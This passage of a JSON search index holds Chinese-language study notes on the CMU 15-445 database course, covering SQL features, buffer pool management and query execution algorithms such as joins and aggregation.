\u5c5e\u6027\uff0c\u8fd9\u4e00\u95ee\u9898\u540c\u6837\u660e\u663e\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684 DBMS\uff0c\u8981\u60f3\u83b7\u53d6\u5f53\u524d\u7684\u65f6\u95f4\u6233\uff1a</p> <pre><code>SELECT NOW();\n\nSELECT CURRENT_TIMESTAMP();\n\nSELECT CURRENT_TIMESTAMP;\n</code></pre> <p>\u5f53\u6211\u4eec\u5c1d\u8bd5\u5728 MySQL \u4e2d\u8ba1\u7b97\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u7684\u5929\u6570\u5dee\uff1a</p> <pre><code>SELECT DATE('2020-09-02')-DATE('2020-01-01') AS days;\n\nRESULT:\n+------+\n| days |\n+------+\n|  801 |\n+------+\n</code></pre> <p>\u53ef\u4ee5\u731c\u51fa\u6765\uff0c\u8fd9\u91cc\u7684\u8fd4\u56de\u7ed3\u679c\u660e\u663e\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u6570\u5b57 <code>8</code> \u8868\u793a\u6708\u4efd\u76f8\u51cf\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5bf9\u4e8e MySQL\uff0c\u6211\u4eec\u5e94\u4f7f\u7528\u5176\u5185\u7f6e\u7684 <code>DATEDIFF</code> \u51fd\u6570\uff1a</p> <pre><code>SELECT DATADIFF(DATE('2020-09-02') ,DATE('2020-01-01')) AS days\n</code></pre>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#output-control-redirection","title":"Output Control + Redirection","text":"<p>\u6211\u4eec\u4e0d\u53ea\u5e0c\u671b\u5c06\u67e5\u8be2\u7684\u7ed3\u679c\u8f93\u51fa\u5230\u7ec8\u7aef\u4e0a\uff0c\u6709\u65f6\u8fd8\u9700\u8981\u5b83\u4eec\u52a0\u5165\u4e00\u4e2a\u65b0\u7684\u5173\u7cfb\u4e2d\uff0c\u8fd9\u65f6\u53ef\u4ee5\u7528\u5230\u8f93\u51fa\u91cd\u5b9a\u5411\uff1a</p> <pre><code>SELECT DISTINCT cid INTO CourseIDs FROM enrolled; -- SQL-92\n\nCREATE TABLE CourseIDs (\nSELECT DISTINCT cid FROM enrolled);               -- MySQL\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u4e0d\u60f3\u8981\u65b0\u5efa\u4e00\u4e2a\u8868\uff0c\u800c\u662f\u5e0c\u671b\u5c06\u7ed3\u679c\u63d2\u5165\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u8868\uff1a</p> <pre><code>INSERT INTO CourseIDs (\nSELECT DISTINCT cid FROM enrolled);\n</code></pre> <p>\u5c3d\u7ba1\u8be5\u63d2\u5165\u8bed\u53e5\u5927\u90e8\u5206 DBMS \u90fd\u662f\u76f8\u540c\u7684\uff0c\u5176\u5185\u90e8\u64cd\u4f5c\u7684\u903b\u8f91\u4e5f\u53ef\u80fd\u4e0d\u76f8\u540c</p> <p><code>ORDER BY</code> \u5173\u952e\u5b57\u7528\u6765\u8c03\u6574\u5143\u7ec4\u8f93\u51fa\u7684\u987a\u5e8f\uff1a</p> <pre><code>SELECT sid, grade FROM enrolled\nWHERE cid = 'CMU 15-721'\nORDER BY grade DESC, sid ASC\n</code></pre> <p>SQL \u6807\u51c6\u4e2d\uff0c\u9ed8\u8ba4\u662f\u5347\u5e8f</p> <p><code>LIMIT</code> \u5173\u952e\u5b57\u7528\u6765\u9650\u5236\u8f93\u51fa\u5143\u7ec4\u7684\u6570\u91cf\uff1a</p> <pre><code>SELECT sid, name FROM student\nWHERE login LIKE '%@CS'\nLIMIT 20 OFFSET 10\n</code></pre> <p>\u5176\u4e2d <code>OFFSET</code> \u5173\u952e\u5b57\u7528\u6765\u6307\u5b9a\u4ece\u7b2c\u51e0\u4e2a\u5143\u7d20\u5f00\u59cb\uff0c\u4e0d\u52a0\u5219\u9ed8\u8ba4\u4e3a 0\u3002</p>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#nested-queries","title":"Nested Queries","text":"<pre><code>SELECT name FROM student WHERE sid IN (SELECT sid FROM enrolled)\n\n-- The Same as:\nSELECT name FROM student WHERE sid = ANY(SELECT sid FROM enrolled)\n</code></pre> <p>\u5728\u5d4c\u5957\u67e5\u8be2\u4e2d\uff0c\u5e38\u7528\u7684\u5173\u952e\u5b57\u6709\uff1a</p> <ul> <li><code>ALL</code></li> <li><code>ANY</code></li> <li><code>IN</code> = <code>ANY()</code></li> <li><code>EXISTS</code></li> </ul>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#window-functions","title":"Window Functions","text":"<pre><code>SELECT *, ROW_NUMBER() OVER() AS row_num FROM enrolled\n</code></pre> <p>\u90a3\u4e48\u5728\u8f93\u51fa\u7684\u8868\u7684\u6700\u540e\u4e00\u5217\uff0c\u4f1a\u52a0\u4e0a\u4e00\u5217\u6807\u5934\u4e3a <code>row_num</code> \u7684\u884c\u6570\u3002</p> <p>\u5728 <code>OVER</code> \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>PARTITION</code> \u5173\u952e\u5b57\u6765\u6307\u5b9a\u5206\u7ec4\uff1a</p> <pre><code>SELECT cid, sid, ROW_NUMBER() OVER(PARTITION BY cid)\nFROM enrolled ORDER BY cid\n</code></pre> <p>\u5728\u4e0a\u4f8b\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u5c06\u6bcf\u4e2a\u8bfe\u7a0b\u6309\u7167 <code>cid</code> \u5212\u5206\u4e3a Group\uff0c\u5e76\u5728\u7ec4\u5185\u5b9e\u73b0\u6807\u6ce8\u884c\u53f7\u3002</p> <p>\u7ed3\u5408\u4ee5\u4e0a\u51e0\u4e2a\u7279\u6027\uff0c\u6211\u4eec\u5982\u4f55\u67e5\u8be2\u6bcf\u4e2a\u8bfe\u7a0b\u5f97\u5206\u7b2c\u4e8c\u9ad8\u7684\u5b66\u751f\uff1f</p> <pre><code>SELECT * FROM (\nSELECT *, RANK() OVER(PARTITION BY cid ORDER BY grade) AS rank\nFROM enrolled) AS ranking\nWHERE ranking.rank = 2;\n</code></pre>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#common-table-expressions","title":"Common Table Expressions","text":"<pre><code>WITH cteName (col1, col2) AS (\n    SELECT 1,2 \n)\nSELECT col1 + col2 FROM cteName;\n</code></pre> <p>\u4f7f\u7528 CTE \u53ef\u4ee5\u7b80\u5316\u5d4c\u5957\u67e5\u8be2\u7684\u7ed3\u6784\uff0c\u4f8b\u5982\uff0c\u540c\u6837\u662f\u67e5\u8be2 student ID \u7684\u6700\u5927\u503c\uff0cCTE \u53ef\u5199\u4f5c\uff1a</p> <pre><code>WITH cteSource (maxID) AS (\n    SELECT MAX(sid) FROM enrolled\n)\nSELECT name FROM student, cteSource\nWHERE student.sid = cteSource.maxID\n</code></pre> <p>CTE \u540c\u6837\u53ef\u4ee5\u8c03\u7528\u81ea\u8eab\uff0c\u4f46\u9700\u8981\u52a0\u4e0a <code>RECURSIVE</code> \u5173\u952e\u5b57\uff1a</p> <pre><code>WITH RECURSIVE cteSource (counter) AS (\n    (SELECT 1)\n    UNION\n    (SELECT counter + 1 FROM  cteSource\n    WHERE counter &lt; 10)\n)\n\nSELECT * FROM cteSource;\n</code></pre> <p>\u4f46\u662f SQLite \u548c SQL Server \u90fd\u4e0d\u652f\u6301\u9012\u5f52</p>"},{"location":"Accumulation/CMU15-445/Memory%20Management/","title":"5. Memory Management","text":""},{"location":"Accumulation/CMU15-445/Memory%20Management/#5-memory-management","title":"5. Memory Management","text":"<p> \u7ea6 1230 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Memory%20Management/#introduction","title":"Introduction","text":"<p>DBMS \u8d1f\u8d23\u7ba1\u7406\u5185\u5b58\uff0c\u5e76\u4ece\u78c1\u76d8\u4e2d\u6765\u56de\u79fb\u52a8\u6570\u636e\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\u4e0d\u80fd\u76f4\u63a5\u5728\u78c1\u76d8\u4e2d\u64cd\u4f5c\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u9700\u8981\u6709\u6548\u5730\u5c06\u78c1\u76d8\u4e2d\u7684\u6570\u636e\u79fb\u52a8\u5230\u5185\u5b58\u4e2d\u3002</p> <p>DBMS \u9762\u4e34\u7684\u4e00\u4e2a\u969c\u788d\u662f\u5c3d\u53ef\u80fd\u51cf\u5c11\u79fb\u52a8\u6570\u636e\u901f\u5ea6\u7684\u5f71\u54cd\uff0c\u5728\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\"\u770b\u8d77\u6765\"\u597d\u50cf\u5168\u90e8\u5728\u5185\u5b58\u4e2d\uff0cExecution Engine \u4e0d\u9700\u8981\u62c5\u5fc3\u6570\u636e\u5982\u4f55\u79fb\u52a8\u5230\u5185\u5b58\u4e2d\u3002</p> <p>\u8003\u8651\u8be5\u95ee\u9898\u7684\u89d2\u5ea6\u5206\u4e3a Spatial \u548c Temporal\uff1a</p> <ul> <li>Spatial Control: \u8003\u8651 Pages \u5728\u78c1\u76d8\u4e0a\u7684\u7269\u7406\u4f4d\u7f6e<ul> <li>\u76ee\u6807\u662f\u4f7f\u7ecf\u5e38\u4e00\u8d77\u4f7f\u7528\u7684 Pages \u5728\u78c1\u76d8\u4e0a\u5c3d\u53ef\u80fd\u9760\u8fd1</li> </ul> </li> <li>Temporal Control: \u8003\u8651\u4ec0\u4e48\u65f6\u5019\u8bfb\u53d6 Pages \u5230\u5185\u5b58\u4e2d\uff0c\u4ec0\u4e48\u65f6\u5019\u5c06 Pages \u5199\u56de\u78c1\u76d8<ul> <li>\u76ee\u6807\u662f\u5c3d\u53ef\u80fd\u51cf\u5c11\u8bfb\u53d6\u6570\u636e\u9020\u6210\u7684 Stalls</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Memory%20Management/#buffer-pool","title":"Buffer Pool","text":"<p>\u7f13\u51b2\u6c60\u662f\u4ece\u78c1\u76d8\u8bfb\u53d6 Pages \u7684 in-memory cache\uff0c\u5b83\u672c\u8d28\u662f\u6570\u636e\u5e93\u5185\u90e8\u5206\u914d\u7684\u4e00\u4e2a\u5927\u578b\u5185\u5b58\u533a\u57df\uff0c\u7528\u4e8e\u5b58\u50a8\u4ece\u78c1\u76d8\u83b7\u53d6\u7684 Pages\u3002</p> <p>\u7f13\u51b2\u6c60\u88ab\u5212\u5206\u7ec4\u7ec7\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684 Pages \u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u6570\u7ec4\u9879\u88ab\u79f0\u4e3a Frame\u3002\u6570\u636e\u5e93\u8bf7\u6c42\u9875\u9762\u65f6\uff0c\u4f1a\u5148\u626b\u63cf\u4e00\u904d\u7f13\u51b2\u6c60\uff0c\u5982\u679c\u672a\u80fd\u627e\u5230\u8be5 Page\uff0c\u5219\u4ece\u78c1\u76d8\u4e2d\u5c06\u5176\u526f\u672c\u52a0\u8f7d\u8fdb Frame \u4e2d\u3002</p> <p>\u7f13\u51b2\u6c60\u5fc5\u987b\u7ef4\u62a4\u4e00\u4e9b\u5143\u6570\u636e\u624d\u80fd\u88ab\u9ad8\u6548\u3001\u6b63\u786e\u5730\u4f7f\u7528\u3002</p> <p>Page Table \u662f\u4f4d\u4e8e\u5185\u5b58\u4e2d\u7684\u4e00\u4e2a\u54c8\u5e0c\u8868\uff0c\u7528\u4e8e\u8ddf\u8e2a\u5f53\u524d\u5904\u4e8e\u5185\u5b58\u4e2d\u7684 Page\uff0c\u5b83\u5c06 Page ID \u6620\u5c04\u5230\u7f13\u51b2\u6c60\u4e2d\u5bf9\u5e94\u7684\u5e27\u4f4d\u7f6e\u3002</p> <p>\u533a\u5206 Page Directory: \u4ece Page ID \u6620\u5c04\u5230 File \u5185 Page \u4f4d\u7f6e</p> <p>Page Table \u8fd8\u9700\u8981\u7ef4\u62a4\u6bcf\u4e2a Page \u7684\u989d\u5916\u5143\u6570\u636e\u3001Dirty Flag\u3001pin/reference counter\u7b49\u3002</p> <p>\u6bcf\u5f53\u7ebf\u7a0b\u4fee\u6539 Page\uff0c\u5176 Dirty Flag \u90fd\u4f1a\u88ab\u8be5\u7ebf\u7a0b\u91cd\u65b0\u8bbe\u7f6e\u3002pin/reference counter \u8ddf\u8e2a\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u8be5 Page \u7684\u7ebf\u7a0b\u6570\uff0c\u7ebf\u7a0b\u5728\u8bbf\u95ee Page \u65f6\u5fc5\u987b\u5148\u9012\u589e\u8ba1\u6570\u5668\u3002</p> <p>\u5982\u679c\u8ba1\u6570\u5668\u5927\u4e8e 0\uff0c\u5219\u4e0d\u5141\u8bb8 Storage Manager \u4ece\u5185\u5b58\u4e2d\u79fb\u9664\u8be5 Page</p> <p>\u6570\u636e\u5e93\u4e2d\u7684\u5185\u5b58\u6839\u636e\u4e24\u4e2a\u7b56\u7565\u5206\u914d\u7ed9\u7f13\u51b2\u6c60\uff1a</p> <ul> <li>Global Policies: \u5168\u5c40\u7b56\u7565\u8981\u6c42 DBMS \u4f5c\u51fa\u80fd\u591f\u4f7f\u6b63\u5728\u6267\u884c\u7684\u5168\u90e8\u5de5\u4f5c\u8d1f\u8f7d\u6574\u4f53\u53d7\u76ca\u7684\u51b3\u7b56\uff0c\u5b83\u8003\u8651\u6240\u6709\u6d3b\u52a8\u4e8b\u52a1\u4ee5\u627e\u5230\u5206\u914d\u5185\u5b58\u7684\u6700\u4f73\u51b3\u7b56\u3002</li> <li>Local Policies: \u5c40\u90e8\u7b56\u7565\u4f7f\u5f97\u5355\u4e2a\u67e5\u8be2\u8fd0\u884c\u5f97\u66f4\u5feb\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u4e0d\u5229\u4e8e\u5168\u5c40\u6700\u4f18\u5b9e\u73b0\u3002\u672c\u5730\u7b56\u7565\u4f1a\u5c06 Frame \u5206\u914d\u7ed9\u4e00\u4e9b\u7279\u5b9a\u7684\u4e8b\u52a1\uff0c\u800c\u4e0d\u8003\u8651\u5e76\u53d1\u884c\u4e3a\u3002</li> </ul> <p>\u5927\u591a\u6570\u7cfb\u7edf\u540c\u65f6\u91c7\u7528\u5168\u5c40\u7b56\u7565\u548c\u5c40\u90e8\u7b56\u7565\u3002</p> <p>OS Page Cache</p> <p>\u5927\u591a\u6570\u5bf9\u78c1\u76d8\u64cd\u4f5c\u9700\u8981\u7528 OS \u7684 API \u8fdb\u884c\uff0c\u8fd9\u5c06\u4ea7\u751f OS \u81ea\u5df1\u7684 filesystem cache\u3002\u800c DBMS \u4e00\u822c\u9700\u8981\u4f7f\u7528\u76f4\u63a5 I/O \u64cd\u4f5c\u6765\u7ed5\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u7684\u7f13\u5b58\uff0c\u4ee5\u907f\u514d Page \u7684\u5197\u4f59\u526f\u672c\u548c\u989d\u5916\u7684\u9a71\u9010\u7b56\u7565\u3002</p>"},{"location":"Accumulation/CMU15-445/Memory%20Management/#buffer-pool-optimizations","title":"Buffer Pool Optimizations","text":"<p>\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u4f18\u5316\u7f13\u51b2\u6c60\uff0c\u4f7f\u5176\u9002\u5e94\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u8d1f\u8f7d\u3002</p> <p>Multiple Buffer Pool</p> <p>DBMS \u53ef\u4ee5\u7ef4\u62a4\u591a\u4e2a\u7f13\u51b2\u6c60\u7528\u4e8e\u4e0d\u540c\u76ee\u7684\uff0c\u6bcf\u4e2a\u7f13\u51b2\u6c60\u90fd\u53ef\u4ee5\u91c7\u7528\u4e3a\u5176\u5185\u90e8\u5b58\u50a8\u6570\u636e\u91cf\u8eab\u5b9a\u505a\u7684\u672c\u5730\u7b56\u7565\u3002\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u51cf\u5c11 Latch \u4e89\u7528\u4ee5\u53ca\u6539\u5584\u5c40\u90e8\u6027(Locality)\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u989d\u5916\u7ef4\u62a4\u4e00\u4e2a Object ID \u6216\u8005\u76f4\u63a5\u4f7f\u7528\u54c8\u5e0c\u8868\u6765\u9009\u62e9\u67d0\u4e00 Page \u8981\u8bbf\u95ee\u7684\u7f13\u51b2\u6c60\u3002</p> <p>Pre-fetching</p> <p>DBMS \u53ef\u4ee5\u6839\u636e\u67e5\u8be2\u8ba1\u5212\u9884\u53d6 Page \u6765\u8fdb\u884c\u4f18\u5316\u3002\u7136\u540e\uff0c\u5728\u5904\u7406\u7b2c\u4e00\u7ec4 Pages \u65f6\uff0c\u9884\u5148\u5c06\u7b2c\u4e8c\u7ec4 Pages \u53d6\u5230\u7f13\u51b2\u6c60\u4e2d\u3002</p> <p>DBMS \u5728\u987a\u5e8f\u8bbf\u95ee\u591a\u4e2a Pages \u65f6\u7ecf\u5e38\u4f7f\u7528\u6b64\u65b9\u6cd5</p> <p>Scan Sharing (Synchronized Scan)</p> <p>\u5141\u8bb8\u591a\u4e2a\u67e5\u8be2\u5171\u7528\u4e00\u4e2a\u67e5\u8be2\u6e38\u6807\u3002\u5982\u679c\u67e5\u8be2\u626b\u63cf\u542f\u52a8\u65f6\uff0c\u5df2\u7ecf\u6709\u522b\u7684\u626b\u63cf\u5728\u8fdb\u884c\u4e2d\uff0c\u5219\u53ef\u4ee5\u5c06\u7b2c\u4e8c\u4e2a\u67e5\u8be2\u6e38\u6807\u9644\u52a0\u5230\u73b0\u6709\u6e38\u6807\u4e0a\uff0c\u4ee5\u8282\u7701\u626b\u63cf\u6210\u672c\u3002</p> <p>Buffer Pool Bypass</p> <p>The sequential scan operator will not store fetched pages in the buffer pool to avoid overhead.</p> <ul> <li>Memory is local to running query</li> <li>Works well if operator needs to read a large sequence of pages that are contiguous on disk</li> <li>Can also be used for temporary data (sorting, jsons, ...)</li> </ul>"},{"location":"Accumulation/CMU15-445/Memory%20Management/#buffer-replacement-policies","title":"Buffer Replacement Policies","text":"<p>\u5f53 DBMS \u9700\u8981\u91ca\u653e\u4e00\u4e2a Frame \u6765\u4e3a Page \u817e\u51fa\u7a7a\u95f4\uff0c\u5b83\u5fc5\u987b\u51b3\u5b9a\u4ece\u7f13\u51b2\u6c60\u4e2d\u9a71\u9010\u54ea\u4e2a Page\u3002</p> <ul> <li>LRU<ul> <li>\u7ef4\u62a4\u4e0a\u4e00\u6b21\u8bbf\u95ee\u7684\u65f6\u95f4\u6233\uff0c\u9a71\u9010\u65f6\u95f4\u6233\u6700\u65e9\u7684 Page</li> </ul> </li> <li>CLOCK<ul> <li>LRU \u7684\u53d8\u79cd\uff0c\u4e0d\u518d\u9700\u8981\u7ef4\u62a4\u65f6\u95f4\u6233\uff0c\u6539\u4e3a\u4e00\u4e2a Reference Bit\u3002</li> <li>\u8bbf\u95ee\u65f6\u8bbe\u7f6e Reference Bit \u4e3a 1\u3002\u5f53\u9700\u8981\u9a71\u9010 Page \u65f6\uff0c\u5faa\u73af\u8bbf\u95ee Buffer\uff0c\u5982\u679c\u5f53\u524d\u6e38\u6807\u6307\u5411\u7684 Page \u7684 Ref \u4e3a 1\uff0c\u5219\u5c06\u5176\u8bbe\u7f6e\u4e3a 0\uff0c\u6e38\u6807\u79fb\u52a8\uff1b\u5426\u5219\uff0c\u9a71\u9010\u5b83</li> </ul> </li> <li>Dirty Pages<ul> <li>\u5904\u7406\u5e26 Dirty Bit \u7684 Page \u6709\u4e24\u4e2a\u65b9\u6cd5\uff0c\u8f83\u5feb\u7684\u65b9\u6cd5\u662f\u5220\u9664\u7f13\u51b2\u6c60\u4e2d\u6240\u6709\u975e\u810f\u9875\u9762\uff0c\u53e6\u4e00\u4e2a\u662f\u5c06\u810f\u9875\u9762\u5199\u56de\u78c1\u76d8\uff0c\u4ee5\u786e\u4fdd\u66f4\u6539\u6301\u4e45\u5316\u4fdd\u5b58</li> <li>\u907f\u514d\u4e0d\u5fc5\u8981\u5199\u56de\u7684\u4e00\u79cd\u65b9\u6cd5\u662f background writing\u3002DBMS \u5b9a\u671f\u904d\u5386 Page Table \u5e76\u5c06\u810f\u9875\u9762\u5199\u56de\u78c1\u76d8</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Query%20Execution/","title":"7. Query Execution","text":""},{"location":"Accumulation/CMU15-445/Query%20Execution/#7-query-execution","title":"7. Query Execution","text":"<p> \u7ea6 1568 \u4e2a\u5b57  22 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#sorting-algorithm","title":"Sorting Algorithm","text":"<p>DBMS \u9700\u8981\u5bf9\u6570\u636e\u8fdb\u884c\u6392\u5e8f\uff0c\u56e0\u4e3a tuple \u5728\u5173\u7cfb\u6a21\u578b\u4e0b\u6ca1\u6709\u7279\u5b9a\u7684\u987a\u5e8f\u3002\u6392\u5e8f\u53ef\u80fd\u7528\u4e8e <code>ORDER BY</code>, <code>GROUP BY</code>, <code>JOIN</code>, <code>DISTINCT</code> \u7b49\u8fd0\u7b97\u7b26\u4e2d\u3002</p> <p>\u5982\u679c\u9700\u8981\u6392\u5e8f\u7684\u6570\u636e\u4f4d\u4e8e\u5185\u5b58\u4e2d\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6807\u51c6\u7684\u6392\u5e8f\u7b97\u6cd5\uff08\u5982\u5feb\u901f\u6392\u5e8f\uff09\uff1b\u5426\u5219\uff0c\u53ef\u4ee5\u4f7f\u7528 External Sort\u3002</p> <p>\u5916\u90e8\u6392\u5e8f\u7b49\u7b97\u6cd5\u53ca\u5176\u4f18\u5316\u76f8\u4fe1\u5404\u4f4d\u90fd\u5728\u7b97\u6cd5\u8bfe\u5b66\u8fc7\u4e86</p>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#aggregation-algorithm","title":"Aggregation Algorithm","text":"<p>Aggregation \u8fd0\u7b97\u5c06\u4e00\u7ec4 tuple \u6298\u53e0\u4e3a\u5355\u4e2a\u6807\u91cf\u3002\u5b9e\u73b0\u805a\u5408\u7684\u65b9\u5f0f\u6709\u6392\u5e8f\u548c\u54c8\u5e0c\u4e24\u79cd\uff1a</p> <ul> <li>Sorting<ul> <li>DBMS \u9996\u5148\u5bf9\u5143\u7ec4\u8fdb\u884c <code>GROUP BY</code> \u6392\u5e8f\uff0c\u7136\u540e\u5bf9\u5176\u6267\u884c\u987a\u5e8f\u626b\u63cf\u53bb\u8ba1\u7b97\u805a\u5408\u3002</li> <li>\u6267\u884c\u6392\u5e8f\u805a\u5408\u65f6\uff0c\u4e00\u5b9a\u8981\u5148\u6267\u884c\u7b5b\u9009\u6761\u4ef6\uff08\u5982\u679c\u6709\uff09\uff0c\u518d\u8fdb\u884c\u6392\u5e8f\uff0c\u4ee5\u51cf\u5c11\u5de5\u4f5c\u91cf</li> </ul> </li> <li>Hashing<ul> <li>\u54c8\u5e0c\u7684\u8ba1\u7b97\u6210\u672c\u53ef\u80fd\u6bd4\u6392\u5e8f\u4f4e\u3002DBMS \u5728\u626b\u63cf\u8868\u65f6\u4f1a\u586b\u5145\u4e00\u4e2a\u4e34\u65f6\u54c8\u5e0c\u8868\uff0c\u5bf9\u4e8e\u6bcf\u6761 record \uff0c\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u5728 hash \u8868\u4e2d\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u4fee\u6539\u3002</li> <li>\u5982\u679c\u54c8\u5e0c\u8868\u592a\u5927\u800c\u65e0\u6cd5\u653e\u5165\u5185\u5b58\uff0c\u5219 DBMS \u53ef\u4ee5\u5c06\u5176\u6ea2\u51fa\u5230\u78c1\u76d8\u3002</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#joins-algorithm","title":"Joins Algorithm","text":"<p>\u4e00\u4e2a\u597d\u7684\u6570\u636e\u5e93\u8bbe\u8ba1\u76ee\u6807\u662f\u6700\u5927\u9650\u5ea6\u51cf\u5c11\u4fe1\u606f\u91cd\u590d\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u6839\u636e\u5f52\u4e00\u5316\u7406\u8bba\u7ec4\u5408 Table\u3002</p> <p>\u5bf9\u4e8e\u5206\u522b\u4f4d\u4e8e\u4e24\u4e2a Table \u4e2d\uff0c\u4f46\u662f\u5728 <code>join</code> \u5c5e\u6027\u4e2d\u5339\u914d\u7684\u4e24\u4e2a tuple\uff0c<code>join</code> \u8fd0\u7b97\u7b26\u5c06\u5b83\u4eec\u8fde\u63a5\u5230\u4e00\u8d77\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u8f93\u51fa\u5143\u7ec4\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c<code>join</code> \u8fd0\u7b97\u7b26\u751f\u6210\u7684\u8f93\u51fa\u5143\u7ec4\u7684\u5185\u5bb9\u53d6\u51b3\u4e8e DBMS \u7684\u67e5\u8be2\u5904\u7406\u6a21\u578b\u3001\u5b58\u50a8\u6a21\u578b\u4ee5\u53ca\u67e5\u8be2\u64cd\u4f5c\u672c\u8eab\u3002</p> <p>\u5177\u4f53\u7684\u5b9e\u73b0\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <ul> <li>&lt;1&gt; Nested Loop Join<ul> <li>\u7531\u4e24\u4e2a\u5d4c\u5957\u7684 <code>for</code> \u5faa\u73af\u7ec4\u6210\uff0c\u5206\u522b\u8fed\u4ee3\u4e24\u4e2a Table \u4e2d\u7684\u5143\u7ec4\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u6210\u5bf9\u6bd4\u8f83\u3002\u5916\u90e8 <code>for</code> \u5faa\u73af\u4e2d\u7684\u8868\u79f0\u4e3a\u5916\u90e8\u8868\uff0c\u5185\u90e8 <code>for</code> \u5faa\u73af\u7684\u79f0\u4e3a\u5185\u90e8\u8868\u3002</li> </ul> </li> <li>&lt;2&gt; Sort-Merge Join<ul> <li>\u5148\u5c06\u4e24\u4e2a\u8868 Merge \u6392\u5e8f\uff0c\u5728\u626b\u63cf\u904d\u5386\u627e\u51fa\u5339\u914d\u9879\u3002</li> </ul> </li> <li>&lt;3&gt; Hash Join<ul> <li>\u54c8\u5e0c\u8fde\u63a5\u7b97\u6cd5\u7684\u601d\u60f3\u662f\u4f7f\u7528\u54c8\u5e0c\u8868\uff0c\u6839\u636e tuple \u7684 <code>join</code> \u5c5e\u6027\u5c06\u5143\u7ec4\u62c6\u5206\u4e3a\u66f4\u5c0f\u7684\u5757\u3002</li> </ul> </li> </ul> Algorithm I/O Cost Example Simple Nested Loop Join M+(m*N) 1.4 hours Block Nested Loop Join M+(M*N) 50 seconds Index Nested Loop Join M+(m*C) Varies Sort-Merge Join M+N+(sort cost) 0.75 seconds Hash Join 3*(M+N) 0.45 seconds <p>\u4f7f\u7528\u7684\u53d8\u91cf</p> <ul> <li>\u8868 \\(R\\)\uff08\u5916\u8868\uff09\u4e2d\u7684 M \u4e2a Pages\uff0c\u5171 m \u4e2a tuples</li> <li>\u8868 \\(S\\)\uff08\u5185\u8868\uff09\u4e2d\u7684 N \u4e2a Pages\uff0c\u5171 n \u4e2a tuples</li> </ul>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#query-processing","title":"Query Processing","text":"<p>DBMS \u5c06 SQL \u8bed\u53e5\u8f6c\u6362\u4e3a Query Plan\uff0c\u67e5\u8be2\u8ba1\u5212\u4e2d\u7684\u8fd0\u7b97\u4ee5\u6811\u72b6\u6392\u5217(\u4e00\u822c\u662f\u4e8c\u53c9\u6811)\uff0c\u6570\u636e\u4ece\u53f6\u5b50\u6d41\u5411\u6839\uff0c\u6839\u8282\u70b9\u7684\u8f93\u51fa\u5373\u4e3a\u67e5\u8be2\u7684\u7ed3\u679c\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e0b\u9762\u67e5\u8be2\u8bed\u53e5\uff0c\u8f6c\u6362\u7684 Query Plan \u4e3a\uff1a</p> <pre><code>SELECT R.id, S.cdate\nFROM R JOIN S\nON R.id = S.id\nWHERE S.value &gt; 100\n\n-- Query Plan can be:\nProject (R.id, S.cdate)\n    |\n  Select (S.value &gt; 100)\n    |\n  Join (R.id = S.id)\n   / \\\n  R   S\n\n-- OR:\nProject (R.id, S.cdate)\n    |\n  Join (R.id = S.id)\n   / \\\n  |  Select (S.value &gt; 100)\n  |   |\n  R   S\n</code></pre>"},{"location":"Accumulation/CMU15-445/Query%20Execution/#processing-model","title":"Processing Model","text":"<p>\u5904\u7406\u6a21\u578b\u5b9a\u4e49\u4e86\u7cfb\u7edf\u5982\u4f55\u6267\u884c Query Plan\uff0c\u5b83\u6307\u5b9a\u4e86\u67e5\u8be2\u8ba1\u5212\u7684\u8bc4\u4f30\u65b9\u5411\u4ee5\u53ca\u4f20\u9012\u7684\u6570\u636e\u7c7b\u578b\u7b49\u3002\u9488\u5bf9\u4e0d\u540c\u7684\u5de5\u4f5c\u8d1f\u8f7d\uff0c\u4e00\u822c\u91c7\u7528\u4e0d\u540c\u5904\u7406\u6a21\u578b\u3002</p> <p>\u5904\u7406\u6a21\u578b\u53ef\u4ee5\u4ece\u4e0a\u5230\u4e0b\u6216\u4ece\u4e0b\u5230\u4e0a\u8c03\u7528 Operators\uff0ctop-to-bottom 